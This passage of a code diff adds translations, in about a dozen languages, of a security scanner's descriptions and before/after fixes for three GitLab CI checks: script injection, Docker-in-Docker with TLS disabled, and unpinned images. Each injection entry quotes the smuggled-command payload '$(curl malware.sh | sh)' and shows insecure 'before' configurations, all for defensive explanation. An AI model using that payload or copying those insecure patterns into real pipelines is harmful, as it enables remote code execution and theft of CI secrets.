+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # diteruskan sebagai argumen ke perintah, tidak pernah di dalam string "bash -c" yang akan menginterpretasikannya ulang`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker pada pipeline GitLab CI berjalan dengan enkripsi TLS dimatikan',
+      description: 'Job ini menggunakan layanan "docker:dind" (Docker-in-Docker, diperlukan untuk membangun image di dalam pipeline) tetapi menyetel "DOCKER_TLS_CERTDIR" ke string kosong, sepenuhnya mematikan enkripsi TLS antara klien Docker dan daemon dind. Tanpa TLS, siapa pun yang bisa menjangkau port tersebut di jaringan internal runner yang sama dapat mengendalikan daemon Docker — yang berjalan dengan hak istimewa yang diperluas — bukan hanya terbatas pada job yang seharusnya menggunakannya.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS tetap aktif antara klien Docker dan daemon dind — "" mematikannya sepenuhnya`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'Image Docker pipeline GitLab CI tidak dipatok ke versi tertentu',
+      description: '"image:" pada pipeline menunjuk ke image tanpa tag (setara dengan ":latest") atau secara eksplisit ke ":latest". Siapa pun yang mengelola image tersebut bisa mengganti isinya kapan saja tanpa repository berubah — pipeline yang sama bisa mulai menjalankan kode berbeda dari satu hari ke hari berikutnya, risiko rantai pasokan yang secara konsep sama dengan GitHub Action yang direferensikan lewat tag, bukan commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # tag spesifik (atau lebih baik lagi digest "node@sha256:...") alih-alih "latest"`,
+      },
+    },
 },
   de: {
   "supabase-service-role-in-client": {
@@ -6150,6 +6502,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'Ein von einem externen Nutzer kontrollierter Wert durchläuft in der GitLab-CI-Pipeline eine zweite Shell',
+      description: 'Eine "script:"-Zeile (oder "before_script:"/"after_script:") verwendet "eval" oder "sh -c"/"bash -c" zusammen mit einer vordefinierten GitLab-Variable wie dem Titel der Merge Request, der Commit-Message oder dem Branch-Namen — all das kann jeder schreiben, der eine Merge Request öffnet, auch aus einem externen Fork. Der Wert wird zuerst von der äußeren Shell expandiert und dann in einen String eingefügt, den die zweite Shell erneut als Code interpretiert: ein Titel wie "$(curl malware.sh | sh)" würde in der Pipeline beliebige Befehle ausführen, mit Zugriff auf alle in diesem Job verfügbaren Secrets.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # als Argument an den Befehl übergeben, nie innerhalb eines "bash -c"-Strings, der es erneut interpretieren würde`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker in der GitLab-CI-Pipeline läuft mit deaktivierter TLS-Verschlüsselung',
+      description: 'Der Job nutzt den Dienst "docker:dind" (Docker-in-Docker, nötig um Images innerhalb der Pipeline zu bauen), setzt aber "DOCKER_TLS_CERTDIR" auf einen leeren String und deaktiviert damit die TLS-Verschlüsselung zwischen Docker-Client und dind-Daemon vollständig. Ohne TLS kann jeder, der diesen Port im selben internen Netzwerk des Runners erreicht, den Docker-Daemon kontrollieren — der mit erweiterten Rechten läuft — statt auf den Job beschränkt zu sein, der ihn eigentlich nutzen soll.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS bleibt zwischen Docker-Client und dind-Daemon aktiv — "" deaktiviert es vollständig`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'Das Docker-Image der GitLab-CI-Pipeline ist nicht auf eine bestimmte Version festgelegt',
+      description: 'Ein "image:" der Pipeline verweist auf ein Image ohne Tag (entspricht ":latest") oder explizit auf ":latest". Wer dieses Image pflegt, kann dessen Inhalt jederzeit austauschen, ohne dass sich das Repository ändert — dieselbe Pipeline kann von einem Tag auf den anderen plötzlich anderen Code ausführen, ein Supply-Chain-Risiko, das konzeptionell identisch mit einer per Tag statt per Commit referenzierten GitHub Action ist.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # ein konkreter Tag (oder noch besser ein Digest "node@sha256:...") statt "latest"`,
+      },
+    },
 },
   fi: {
   "supabase-service-role-in-client": {
@@ -6658,6 +7042,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP:n erikoismerkit pitää aina escapeta ennen niiden käyttöä suodattimessa\nclient.search(base, { filter });`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'Ulkoisen käyttäjän hallitsema arvo kulkee toisen kuoren läpi GitLab CI -putkessa',
+      description: '"script:"-rivi (tai "before_script:"/"after_script:") käyttää komentoa "eval" tai "sh -c"/"bash -c" yhdessä GitLabin ennalta määritellyn muuttujan kanssa, kuten merge requestin otsikko, commit-viesti tai haaran nimi — kaikki näistä voi kirjoittaa kuka tahansa, joka avaa merge requestin, jopa ulkoisesta forkista. Arvo laajennetaan ensin ulkoisessa kuoressa ja liitetään sitten merkkijonoon, jonka toinen kuori tulkitsee uudelleen koodina: otsikko kuten "$(curl malware.sh | sh)" suorittaisi mielivaltaisia komentoja putkessa, pääsyllä kaikkiin kyseisen jobin saatavilla oleviin secreteihin.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # välitetty komennon argumenttina, ei koskaan "bash -c" -merkkijonon sisällä, joka tulkitsisi sen uudelleen`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker GitLab CI -putkessa toimii TLS-salaus pois päältä',
+      description: 'Job käyttää "docker:dind"-palvelua (Docker-in-Docker, tarvitaan image-rakentamiseen putken sisällä), mutta asettaa "DOCKER_TLS_CERTDIR"-arvoksi tyhjän merkkijonon, mikä poistaa TLS-salauksen kokonaan käytöstä Docker-clientin ja dind-daemonin väliltä. Ilman TLS:ää kuka tahansa, joka pääsee käsiksi tuohon porttiin samassa runnerin sisäverkossa, voi hallita Docker-daemonia — joka toimii laajennetuilla oikeuksilla — sen sijaan että rajoittuisi vain siihen jobiin, jonka pitäisi sitä käyttää.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS pysyy päällä Docker-clientin ja dind-daemonin välillä — "" poistaa sen kokonaan käytöstä`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI -putken Docker-image ei ole kiinnitetty tiettyyn versioon',
+      description: 'Putken "image:" osoittaa imageen ilman tagia (vastaa ":latest"-tagia) tai suoraan ":latest"-tagiin. Kuka tahansa kyseistä imagea ylläpitää, voi vaihtaa sen sisällön milloin tahansa ilman että repositorio muuttuu — sama putki voi alkaa ajaa eri koodia päivästä toiseen, mikä on toimitusketjuriski, joka vastaa käsitteellisesti tagilla eikä commitilla viitattua GitHub Actionia.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # tietty tagi (tai vielä parempi digest "node@sha256:...") "latest"-tagin sijaan`,
+      },
+    },
 },
   nl: {
   "supabase-service-role-in-client": {
@@ -7340,6 +7756,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'Een door een externe gebruiker gecontroleerde waarde gaat via een tweede shell in de GitLab CI-pipeline',
+      description: 'Een "script:"-regel (of "before_script:"/"after_script:") gebruikt "eval" of "sh -c"/"bash -c" samen met een vooraf gedefinieerde GitLab-variabele zoals de titel van de merge request, de commit-message of de branchnaam — allemaal te schrijven door iedereen die een merge request opent, zelfs vanuit een externe fork. De waarde wordt eerst door de buitenste shell geëxpandeerd en vervolgens geplakt in een string die de tweede shell opnieuw als code interpreteert: een titel als "$(curl malware.sh | sh)" zou willekeurige commando\'s uitvoeren in de pipeline, met toegang tot alle secrets die in die job beschikbaar zijn.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # doorgegeven als argument aan het commando, nooit binnen een "bash -c"-string die het opnieuw zou interpreteren`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker in de GitLab CI-pipeline draait met uitgeschakelde TLS-versleuteling',
+      description: 'De job gebruikt de "docker:dind"-service (Docker-in-Docker, nodig om images binnen de pipeline te bouwen), maar zet "DOCKER_TLS_CERTDIR" op een lege string, waardoor TLS-versleuteling tussen de Docker-client en de dind-daemon volledig wordt uitgeschakeld. Zonder TLS kan iedereen die die poort op hetzelfde interne netwerk van de runner kan bereiken de Docker-daemon — die met uitgebreide rechten draait — overnemen, in plaats van beperkt te blijven tot de job die hem zou moeten gebruiken.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS blijft actief tussen de Docker-client en de dind-daemon — "" schakelt het volledig uit`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'De Docker-image van de GitLab CI-pipeline is niet vastgezet op een specifieke versie',
+      description: 'Een "image:" in de pipeline wijst naar een image zonder tag (gelijk aan ":latest") of expliciet naar ":latest". Wie dat image onderhoudt, kan de inhoud op elk moment vervangen zonder dat de repository verandert — dezelfde pipeline kan van de ene op de andere dag andere code gaan draaien, een supply-chain-risico dat conceptueel identiek is aan een GitHub Action die via een tag in plaats van een commit wordt gerefereerd.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # een specifieke tag (of nog beter een digest "node@sha256:...") in plaats van "latest"`,
+      },
+    },
 },
   pl: {
   "supabase-service-role-in-client": {
@@ -7848,6 +8296,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'Wartość kontrolowana przez zewnętrznego użytkownika przechodzi przez drugą powłokę w pipeline GitLab CI',
+      description: 'Linia "script:" (lub "before_script:"/"after_script:") używa "eval" lub "sh -c"/"bash -c" razem ze zmienną predefiniowaną GitLaba, taką jak tytuł merge requesta, wiadomość commita czy nazwa brancha — wszystko to może zapisać każdy, kto otworzy merge request, nawet z zewnętrznego forka. Wartość jest najpierw rozwijana przez zewnętrzną powłokę, a następnie wklejana do ciągu znaków, który druga powłoka ponownie interpretuje jako kod: tytuł taki jak "$(curl malware.sh | sh)" wykonałby dowolne polecenia w pipeline, z dostępem do wszystkich sekretów dostępnych w tym zadaniu.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # przekazane jako argument do polecenia, nigdy wewnątrz ciągu "bash -c", który zinterpretowałby je ponownie`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker w pipeline GitLab CI działa z wyłączonym szyfrowaniem TLS',
+      description: 'Zadanie używa usługi "docker:dind" (Docker-in-Docker, potrzebnej do budowania obrazów wewnątrz pipeline), ale ustawia "DOCKER_TLS_CERTDIR" na pusty ciąg znaków, całkowicie wyłączając szyfrowanie TLS między klientem Dockera a demonem dind. Bez TLS każdy, kto może dosięgnąć tego portu w tej samej wewnętrznej sieci runnera, może przejąć kontrolę nad demonem Dockera — działającym z rozszerzonymi uprawnieniami — zamiast być ograniczonym tylko do zadania, które powinno z niego korzystać.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS pozostaje włączone między klientem Dockera a demonem dind — "" całkowicie je wyłącza`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'Obraz Dockera w pipeline GitLab CI nie jest przypięty do konkretnej wersji',
+      description: '"image:" w pipeline wskazuje na obraz bez tagu (co odpowiada ":latest") lub jawnie na ":latest". Osoba utrzymująca ten obraz może zastąpić jego zawartość w dowolnym momencie bez zmiany repozytorium — ten sam pipeline może z dnia na dzień zacząć uruchamiać inny kod, co jest ryzykiem łańcucha dostaw koncepcyjnie identycznym z akcją GitHub odwołującą się do tagu zamiast do commita.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # konkretny tag (albo jeszcze lepiej digest "node@sha256:...") zamiast "latest"`,
+      },
+    },
 },
   sv: {
   "supabase-service-role-in-client": {
@@ -8356,6 +8836,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'Ett värde som styrs av en extern användare passerar genom ett andra skal i GitLab CI-pipelinen',
+      description: 'En "script:"-rad (eller "before_script:"/"after_script:") använder "eval" eller "sh -c"/"bash -c" tillsammans med en fördefinierad GitLab-variabel som titeln på en merge request, commit-meddelandet eller grennamnet — allt detta kan skrivas av vem som helst som öppnar en merge request, även från en extern fork. Värdet expanderas först av det yttre skalet och klistras sedan in i en sträng som det andra skalet tolkar igen som kod: en titel som "$(curl malware.sh | sh)" skulle köra godtyckliga kommandon i pipelinen, med tillgång till alla hemligheter som är tillgängliga i det jobbet.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # skickas som argument till kommandot, aldrig inuti en "bash -c"-sträng som skulle tolka om det`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker i GitLab CI-pipelinen körs med TLS-kryptering avstängd',
+      description: 'Jobbet använder tjänsten "docker:dind" (Docker-in-Docker, behövs för att bygga images inuti pipelinen) men sätter "DOCKER_TLS_CERTDIR" till en tom sträng, vilket stänger av TLS-krypteringen mellan Docker-klienten och dind-demonen helt. Utan TLS kan vem som helst som når den porten på samma interna nätverk som runnern ta kontroll över Docker-demonen — som körs med utökade rättigheter — istället för att vara begränsad till jobbet som ska använda den.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS förblir aktiverat mellan Docker-klienten och dind-demonen — "" stänger av det helt`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'Docker-avbildningen i GitLab CI-pipelinen är inte låst till en specifik version',
+      description: 'Ett "image:" i pipelinen pekar på en avbildning utan tagg (motsvarar ":latest") eller uttryckligen på ":latest". Den som underhåller avbildningen kan byta ut innehållet när som helst utan att repot ändras — samma pipeline kan plötsligt börja köra annan kod, en supply chain-risk som konceptuellt är identisk med en GitHub Action som refereras via tagg istället för commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # en specifik tagg (eller ännu hellre ett digest "node@sha256:...") istället för "latest"`,
+      },
+    },
 },
   da: {
   "supabase-service-role-in-client": {
@@ -8864,6 +9376,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'En værdi styret af en ekstern bruger passerer gennem en anden shell i GitLab CI-pipelinen',
+      description: 'En "script:"-linje (eller "before_script:"/"after_script:") bruger "eval" eller "sh -c"/"bash -c" sammen med en foruddefineret GitLab-variabel som titlen på en merge request, commit-beskeden eller branchnavnet — alt sammen noget enhver, der åbner en merge request, kan skrive, selv fra en ekstern fork. Værdien udvides først af den ydre shell og indsættes derefter i en streng, som den anden shell igen fortolker som kode: en titel som "$(curl malware.sh | sh)" ville køre vilkårlige kommandoer i pipelinen med adgang til alle hemmeligheder tilgængelige i det job.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # sendt som argument til kommandoen, aldrig inde i en "bash -c"-streng, der ville fortolke det igen`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker i GitLab CI-pipelinen kører med TLS-kryptering deaktiveret',
+      description: 'Jobbet bruger tjenesten "docker:dind" (Docker-in-Docker, nødvendig for at bygge images inde i pipelinen), men sætter "DOCKER_TLS_CERTDIR" til en tom streng, hvilket deaktiverer TLS-krypteringen mellem Docker-klienten og dind-dæmonen helt. Uden TLS kan enhver, der kan nå den port på runnerens samme interne netværk, kontrollere Docker-dæmonen — der kører med udvidede rettigheder — i stedet for at være begrænset til det job, der skulle bruge den.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS forbliver aktivt mellem Docker-klienten og dind-dæmonen — "" deaktiverer det helt`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI-pipelinens Docker-image er ikke fastlåst til en bestemt version',
+      description: 'Et "image:" i pipelinen peger på et image uden tag (svarer til ":latest") eller eksplicit til ":latest". Den, der vedligeholder det image, kan udskifte dets indhold når som helst uden at repositoryet ændrer sig — den samme pipeline kan fra den ene dag til den anden begynde at køre anden kode, en forsyningskæderisiko, der konceptuelt er identisk med en GitHub Action, der refereres via tag i stedet for commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # et specifikt tag (eller endnu bedre et digest "node@sha256:...") i stedet for "latest"`,
+      },
+    },
 },
   nb: {
   "supabase-service-role-in-client": {
@@ -9372,6 +9916,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'En verdi kontrollert av en ekstern bruker går gjennom et andre skall i GitLab CI-pipelinen',
+      description: 'En "script:"-linje (eller "before_script:"/"after_script:") bruker "eval" eller "sh -c"/"bash -c" sammen med en forhåndsdefinert GitLab-variabel som tittelen på en merge request, commit-meldingen eller grennavnet — alt dette kan skrives av hvem som helst som åpner en merge request, selv fra en ekstern fork. Verdien blir først utvidet av det ytre skallet og limt inn i en streng som det andre skallet igjen tolker som kode: en tittel som "$(curl malware.sh | sh)" ville kjørt vilkårlige kommandoer i pipelinen, med tilgang til alle hemmeligheter tilgjengelige i den jobben.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # sendt som argument til kommandoen, aldri inni en "bash -c"-streng som ville tolket det på nytt`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker i GitLab CI-pipelinen kjører med TLS-kryptering deaktivert',
+      description: 'Jobben bruker tjenesten "docker:dind" (Docker-in-Docker, nødvendig for å bygge images inne i pipelinen), men setter "DOCKER_TLS_CERTDIR" til en tom streng, som deaktiverer TLS-kryptering mellom Docker-klienten og dind-daemonen helt. Uten TLS kan hvem som helst som når den porten på samme interne nettverk som runneren kontrollere Docker-daemonen — som kjører med utvidede rettigheter — i stedet for å være begrenset til jobben som skal bruke den.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS forblir aktivt mellom Docker-klienten og dind-daemonen — "" deaktiverer det helt`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'Docker-imaget til GitLab CI-pipelinen er ikke låst til en bestemt versjon',
+      description: 'Et "image:" i pipelinen peker på et image uten tag (tilsvarer ":latest") eller eksplisitt til ":latest". Den som vedlikeholder det imaget kan bytte ut innholdet når som helst uten at repoet endres — den samme pipelinen kan fra en dag til den neste begynne å kjøre annen kode, en forsyningskjederisiko som konseptuelt er identisk med en GitHub Action referert via tag i stedet for commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # en spesifikk tag (eller enda bedre et digest "node@sha256:...") i stedet for "latest"`,
+      },
+    },
 },
   tr: {
   "supabase-service-role-in-client": {
@@ -9880,6 +10456,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'Harici bir kullanıcının kontrol ettiği bir değer, GitLab CI pipeline\'ında ikinci bir shell\'den geçiyor',
+      description: 'Bir "script:" satırı (veya "before_script:"/"after_script:") merge request başlığı, commit mesajı veya branch adı gibi önceden tanımlanmış bir GitLab değişkeniyle birlikte "eval" veya "sh -c"/"bash -c" kullanıyor — bunların hepsi, harici bir fork\'tan bile olsa, bir merge request açan herkes tarafından yazılabilir. Değer önce dış shell tarafından genişletilir, sonra ikinci shell\'in yeniden kod olarak yorumladığı bir dizenin içine yapıştırılır: "$(curl malware.sh | sh)" gibi bir başlık, o job\'da kullanılabilen tüm sırlara erişimle birlikte pipeline\'da rastgele komutlar çalıştırır.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # komuta argüman olarak geçirildi, onu yeniden yorumlayacak bir "bash -c" dizesinin içinde asla`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'GitLab CI pipeline\'ındaki Docker-in-Docker, TLS şifrelemesi devre dışı bırakılmış şekilde çalışıyor',
+      description: 'Job, "docker:dind" servisini (pipeline içinde image oluşturmak için gereken Docker-in-Docker) kullanıyor ama "DOCKER_TLS_CERTDIR"i boş bir dizeye ayarlayarak Docker istemcisi ile dind daemon\'ı arasındaki TLS şifrelemesini tamamen devre dışı bırakıyor. TLS olmadan, runner\'ın aynı iç ağında o porta erişebilen herkes — yalnızca onu kullanması gereken job ile sınırlı kalmak yerine — genişletilmiş ayrıcalıklarla çalışan Docker daemon\'ını kontrol edebilir.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # Docker istemcisi ile dind daemon'ı arasında TLS etkin kalır — "" onu tamamen devre dışı bırakır`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI pipeline\'ının Docker image\'ı belirli bir sürüme sabitlenmemiş',
+      description: 'Pipeline\'daki bir "image:" etiketsiz bir image\'a (bu ":latest"e eşdeğerdir) ya da açıkça ":latest"e işaret ediyor. O image\'ı bakımını yapan kişi, depo değişmeden içeriğini istediği zaman değiştirebilir — aynı pipeline bir günden diğerine farklı kod çalıştırmaya başlayabilir; bu, commit yerine etiketle referans verilen bir GitHub Action ile kavramsal olarak aynı tedarik zinciri riskidir.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # "latest" yerine belirli bir etiket (ya da daha iyisi bir digest "node@sha256:...")`,
+      },
+    },
 },
   uk: {
   "supabase-service-role-in-client": {
@@ -10388,6 +10996,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<очікуваний hash>  /tmp/install.sh" | sha256sum -c -`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'Значення, яке контролює зовнішній користувач, проходить через другу оболонку в пайплайні GitLab CI',
+      description: 'Рядок "script:" (або "before_script:"/"after_script:") використовує "eval" чи "sh -c"/"bash -c" разом із попередньо визначеною змінною GitLab, такою як заголовок merge request, повідомлення коміту чи назва гілки — усе це може написати будь-хто, хто відкриває merge request, навіть із зовнішнього форку. Значення спочатку розгортається зовнішньою оболонкою, а потім вставляється в рядок, який друга оболонка знову інтерпретує як код: заголовок на кшталт "$(curl malware.sh | sh)" виконав би довільні команди в пайплайні з доступом до всіх секретів, доступних у цьому завданні.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # передано як аргумент команді, ніколи всередині рядка "bash -c", який би повторно його інтерпретував`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker у пайплайні GitLab CI працює з вимкненим TLS-шифруванням',
+      description: 'Завдання використовує сервіс "docker:dind" (Docker-in-Docker, потрібен для збирання образів усередині пайплайну), але встановлює "DOCKER_TLS_CERTDIR" як порожній рядок, повністю вимикаючи TLS-шифрування між клієнтом Docker і демоном dind. Без TLS будь-хто, хто може дістатися до цього порту в тій самій внутрішній мережі раннера, може керувати демоном Docker — який працює з розширеними привілеями — замість того, щоб бути обмеженим лише тим завданням, яке має його використовувати.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS залишається увімкненим між клієнтом Docker і демоном dind — "" повністю вимикає його`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'Docker-образ пайплайну GitLab CI не закріплений за конкретною версією',
+      description: '"image:" у пайплайні вказує на образ без тега (що відповідає ":latest") або явно на ":latest". Той, хто підтримує цей образ, може замінити його вміст у будь-який момент без зміни репозиторію — той самий пайплайн може одного дня почати виконувати інший код, що є ризиком ланцюга постачання, концептуально ідентичним до GitHub Action, на який посилаються за тегом, а не за комітом.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # конкретний тег (або ще краще дайджест "node@sha256:...") замість "latest"`,
+      },
+    },
 },
   ja: {
   "supabase-service-role-in-client": {
@@ -10896,6 +11536,38 @@ router.post("/login", loginLimiter, loginHandler)`,
       after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: '外部ユーザーが制御する値がGitLab CIパイプラインで2段目のシェルを通過する',
+      description: '"script:"（または "before_script:"/"after_script:"）の行が、マージリクエストのタイトル、コミットメッセージ、ブランチ名などのGitLab定義済み変数と一緒に "eval" や "sh -c"/"bash -c" を使っている — これらはすべて、外部フォークからであってもマージリクエストを開ける人なら誰でも書き込める。値はまず外側のシェルで一度展開され、それが2段目のシェルが再びコードとして解釈する文字列に貼り付けられる："$(curl malware.sh | sh)" のようなタイトルは、そのジョブで使えるすべてのシークレットにアクセスしながらパイプライン内で任意のコマンドを実行してしまう。',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # コマンドへの引数として渡す。再解釈されてしまう "bash -c" 文字列の中に入れない`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'GitLab CIパイプラインのDocker-in-DockerがTLS暗号化を無効にしたまま動いている',
+      description: 'このジョブは "docker:dind"（パイプライン内でイメージをビルドするために必要なDocker-in-Docker）サービスを使っているが、"DOCKER_TLS_CERTDIR" を空文字列に設定しており、DockerクライアントとdindデーモンとのTLS暗号化が完全に無効になっている。TLSがなければ、ランナーの同じ内部ネットワーク上でそのポートに到達できる人は誰でも、本来そのジョブだけに限定されるべき、拡張された権限で動くDockerデーモンを制御できてしまう。',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # DockerクライアントとdindデーモンとのTLSが有効なまま — ""にすると完全に無効化される`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CIパイプラインのDockerイメージが特定バージョンに固定されていない',
+      description: 'パイプラインの "image:" がタグなしのイメージ（":latest" と同等）を指しているか、明示的に ":latest" を指している。そのイメージを管理する人は、リポジトリを変更せずにいつでも中身を差し替えられる — 同じパイプラインがある日突然違うコードを実行し始める可能性があり、コミットではなくタグで参照するGitHub Actionと概念的に同じサプライチェーンリスクになる。',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # "latest" の代わりに具体的なタグ（さらに良いのはダイジェスト "node@sha256:..."）`,
+      },
+    },
 },
   ko: {
   "supabase-service-role-in-client": {
@@ -11404,5 +12076,37 @@ router.post("/login", loginLimiter, loginHandler)`,
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: '외부 사용자가 제어하는 값이 GitLab CI 파이프라인에서 두 번째 셸을 거칩니다',
